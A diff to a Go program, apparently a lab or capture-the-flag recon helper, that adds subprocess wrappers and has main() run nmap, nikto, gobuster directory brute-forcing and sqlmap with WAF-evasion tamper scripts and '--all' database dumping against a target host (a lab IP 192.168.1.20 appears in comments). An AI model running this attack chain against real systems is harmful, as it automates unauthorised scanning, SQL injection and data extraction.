@@ -1,6 +1,7 @@
 package main
 
 import (
+	"bufio"
 	"flag"
 	. "fmt"
 	"log"
@@ -31,6 +32,131 @@ func execCmd(cmd string) string {
 	var res string = Sprintf("\n%s output is: \n-------------\n%s\n%s\n\n", cmd, out, err) //Sprintf() questionable
 
 	return res
+}
+
+//	Opens another program in go		-	Reading Std Output Stream
+//	@TODO	Check	https://gobyexample.com/spawning-processes
+func execCmdInt(cmd string) {
+
+	var s []string = strings.Split(cmd, " ")
+
+	var res string = Sprintf("\n%s output is: \n-------------\n", s[0]) //Sprintf() questionable
+	Print(res)
+
+	//csubprocess := exec.Command("sqlmap", "-u 192.168.1.20/index.php", "--forms", "--tamper=randomcase,space2comment", "--all")
+	csubprocess := exec.Command(s[0], s[1:]...)
+	cstderr, cerr := csubprocess.StdoutPipe()
+	if cerr = csubprocess.Start(); cerr != nil {
+		log.Fatal("Err in cerr", cerr)
+	}
+
+	scanner := bufio.NewScanner(cstderr)
+	//scanner.Split(bufio.ScanWords)
+	for scanner.Scan() {
+		m := scanner.Text()
+		if strings.Contains(m, "[") {
+			Print("\n", m)
+		} else {
+			Print(m)
+		}
+	}
+
+	csubprocess.Wait() //	Wait for the Process to Exit
+}
+
+//	This will probably be removed
+func execSQLMap() {
+	/*
+		//	WRITES BUT IN A WEIRD WAY
+
+		//csubprocess := exec.Command("sqlmap", "-u 192.168.1.20/index.php", "--forms", "--method=post", "--risk=3", "--level=5", "--tamper=randomcase,space2comment", "--dbs")
+		csubprocess := exec.Command("sqlmap", "-u 192.168.1.20/index.php", "--forms", "--tamper=randomcase,space2comment", "--all")
+		// Single Wrapped next to the Double Wrapped are the Write attempt
+		// //csubprocess := exec.Command("cat")
+
+		// // cstdin, cerr := csubprocess.StdinPipe()
+		// // if cerr != nil {
+		// // 	Println("cerr")
+		// // 	log.Fatal("Err in ex")
+		// // }
+		cstderr, cerr := csubprocess.StdoutPipe()
+		if cerr = csubprocess.Start(); cerr != nil {
+			log.Fatal("Err in cerr", cerr)
+		}
+
+		scanner := bufio.NewScanner(cstderr)
+		scanner.Split(bufio.ScanWords)
+		for scanner.Scan() {
+			m := scanner.Text()
+			if strings.Contains(m, "[") {
+				Print("\n", m)
+			} else {
+				Print(m)
+			}
+		}
+	*/
+
+	csubprocess := exec.Command("sqlmap", "-u 192.168.1.20/index.php", "--forms", "--tamper=randomcase,space2comment", "--all")
+	// Single Wrapped next to the Double Wrapped are the Write attempt
+	// //csubprocess := exec.Command("cat")
+
+	// // cstdin, cerr := csubprocess.StdinPipe()
+	// // if cerr != nil {
+	// // 	Println("cerr")
+	// // 	log.Fatal("Err in ex")
+	// // }
+	cstderr, cerr := csubprocess.StdoutPipe()
+	if cerr = csubprocess.Start(); cerr != nil {
+		log.Fatal("Err in cerr", cerr)
+	}
+
+	scanner := bufio.NewScanner(cstderr)
+	//scanner.Split(bufio.ScanWords)
+	for scanner.Scan() {
+		m := scanner.Text()
+		if strings.Contains(m, "[") {
+			Print("\n", m)
+		} else {
+			Print(m)
+		}
+	}
+
+	csubprocess.Wait()
+
+	//cmd.Stdout = os.Stdout
+
+	// //csubprocess.Stdout = os.Stdout
+	// //csubprocess.Stderr = os.Stderr
+
+	// // if cerr = csubprocess.Start(); cerr != nil {
+	// // 	log.Fatal("Err in Start()", cerr)
+	// // }
+
+	// // io.WriteString(cstdin, "whoami\n")
+	// // //csubprocess.Wait()
+	// go func() {
+	// 	defer cstdin.Close()
+	// 	io.WriteString(cstdin, "values written to stdin are passed to cmd's std in")
+	// }()
+
+	// out, err := csubprocess.CombinedOutput()
+	// if err != nil {
+	// 	log.Fatal(err)
+	// }
+	// Printf("%s", out)
+
+	/*
+		var res string = Sprintf("\n%s output is: \n-------------\n%s\n%s\n\n", c, cout, cerr) //Sprintf() questionable
+
+		Printf(res)
+
+		os.Stdin
+		os.Stdout
+	*/
+	//var sqlmap string = execCmd("sqlmap --forms --crawl=2 " + targetHost)
+	//var sqlmap string = execCmd("sqlmap -u 192.168.1.20/index.php --forms --method=post --risk 3 --level 5 --tamper=space2comment,randomcase --dbs")
+	// https://stackoverflow.com/questions/23166468/how-can-i-get-stdin-to-exec-cmd-in-golang
+	// Printf(sqlmap)
 }
 
 /*
@@ -151,12 +277,23 @@ func main() {
 	} else {
 		pcount = "c" //	If none of the 3 use the *nix variation
 	}
+
+	//	Exec
 	var ping string = execCmd("ping -" + pcount + " 1 " + targetHost)
 	Printf(ping)
-	//Printf(nmap)
-	//Printf(nikto)
+	var nmap string = execCmd("nmap -sSV -T5 " + targetHost)
+	Printf(nmap)
+	var nikto string = execCmd("nikto -h " + targetHost)
+	Printf(nikto)
 
-	Println("File & Folder Utilities:", "\n-------------")
+	// var gobuster string = execCmd("./gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -l -t 50 -x .php,.html,.ini,.py,.java,.sh,.js,.git -u=" + targetHost)
+	// // //	-c 'PHPSESSID:bp78fb8ser34n0hc83v3eu85n6; SecretCookie:VzuuL2gfLJWNnTSwn2kuLv5wo20vBwpjAGWwLJD2LwDkAJL0ZwplLmR5BQMuLGyuAGOuA2ZmBwR1Amt2Awp1ZmH%3D'
+	// Printf(gobuster)
+	//execCmd("./gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -l -t 50 -x .php,.html,.ini,.py,.java,.sh,.js,.git -u=" + targetHost)
+	execCmdInt("./gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -l -t 50 -x .php,.html,.ini,.py,.java,.sh,.js,.git -u=" + targetHost)
+	execCmdInt("sqlmap -u " + targetHost + "/index.php --forms --tamper=randomcase,space2comment --all")
+
+	//Println("File & Folder Utilities:", "\n-------------")
 
 	// go doc windows
 
